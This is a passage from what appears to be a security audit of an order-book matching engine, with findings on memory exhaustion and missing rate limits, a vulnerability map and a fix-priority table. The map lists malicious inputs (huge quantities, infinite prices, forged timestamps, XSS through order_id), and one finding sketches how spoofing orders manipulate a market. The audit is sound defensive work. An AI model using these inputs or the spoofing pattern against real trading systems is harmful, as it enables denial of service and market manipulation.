if order.remaining > 0 and LIMIT:     # False → không vào sổ

# → Order qty=-5 bị bỏ qua hoàn toàn, không có error
```

### Impact

- Silent failure: client nhận `{"ok": True, "trades": []}` nhưng order không được đặt
- Khó debug: không có error message
- Không phải security critical nhưng vi phạm fail-fast principle

---

## SEC-015 · Unbounded Trade History → Memory Exhaustion

**Severity: LOW**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

### Issue

```python
# order_book.py:13
self.trades: list[Trade] = []   # không bao giờ bị trim

# order_book.py:29
self.trades.append(trade)   # mỗi trade được append mãi mãi
```

Nếu system chạy lâu với khối lượng trade lớn, `self.trades` sẽ tiêu thụ
toàn bộ RAM. Với 1 triệu trades × ~200 bytes mỗi Trade ≈ 200MB.
Với SEC-001 (large quantity) kết hợp: 1 order tạo 100,000 trades → 20MB ngay lập tức.

---

## SEC-016 · No Rate Limiting → Spoofing / Layering

**Severity: INFO**

### Issue

Không có rate limiting trên bất kỳ endpoint nào. Cho phép:

**Spoofing / Layering (Market Manipulation):**
```python
# Gửi 10,000 BUY orders @100 → tạo "wall" giả → giá thị trường bị đẩy lên
# Cancel toàn bộ trước khi fill
# Repeat → thao túng market sentiment
```

**Free Option:** Đặt lệnh lớn, quan sát market reaction, cancel nếu bất lợi.
Không có cancel fee hay cooldown.

---

## Vulnerability Map

```
HTTP API (no auth)
├─ POST /api/orders ─────────────────────────────────────────────────────────
│   ├── SEC-001: qty=10**100 → Loop DoS                          [CRITICAL]
│   ├── SEC-002: price=inf/nan → Sort corruption / sweep all     [CRITICAL]
│   ├── SEC-003: timestamp=0 → Queue jump                        [CRITICAL]
│   ├── SEC-005: price=-100 → Negative price trade               [HIGH]
│   ├── SEC-006: Duplicate order_id → Zombie / audit corruption  [HIGH]
│   ├── SEC-007: No order limit → O(N²) sort DoS                 [HIGH]
│   ├── SEC-012: Missing fields → 500 / stack trace              [MEDIUM]
│   └── SEC-013: XSS via order_id                                [MEDIUM]
│
├─ POST /api/cancel ─────────────────────────────────────────────────────────
│   ├── SEC-004: No auth → cancel any order                      [CRITICAL]
│   ├── SEC-009: TOCTOU → state/event mismatch                   [HIGH]
│   └── SEC-011: SELL cancel no broadcast (Bug3)                 [MEDIUM]
│
└─ GET /ws ──────────────────────────────────────────────────────────────────
    ├── SEC-010: 10k connections → amplification DoS             [HIGH]
    └── SEC-013: XSS via broadcast of unsanitized order_id       [MEDIUM]

Business Logic
├── SEC-008: Wash trading — no self-trade prevention             [HIGH]
└── SEC-016: Spoofing / layering — no rate limit                 [INFO]

Memory
├── SEC-014: Negative qty silent no-op                           [LOW]
└── SEC-015: Unbounded trade history                             [LOW]
```

---

## Recommended Fixes Priority

| Priority | Fix | Addresses |
|----------|-----|-----------|
| P0 | Validate `quantity` ∈ [1, MAX_QTY] và `price` ∈ (0, MAX_PRICE], finite | SEC-001, SEC-002, SEC-004, SEC-005 |
| P0 | Dùng server-side timestamp, không nhận từ client | SEC-003 |
| P0 | Thêm authentication và order ownership | SEC-004, SEC-008 |
| P1 | Enforce order_id uniqueness (dùng dict thay list) | SEC-006 |
| P1 | Giới hạn số orders per side (MAX_ORDERS) | SEC-007 |
| P1 | Broadcast outside lock → pass captured state | SEC-009 |
| P1 | Sửa Bug3: broadcast mọi cancel thành công | SEC-011 |
| P2 | Global error handler middleware | SEC-012 |
| P2 | Sanitize và whitelist order_id characters | SEC-013 |
| P2 | WebSocket connection limit | SEC-010 |
| P3 | Trim trade history hoặc dùng circular buffer | SEC-015 |
| P3 | Rate limiting per IP/user | SEC-016 |
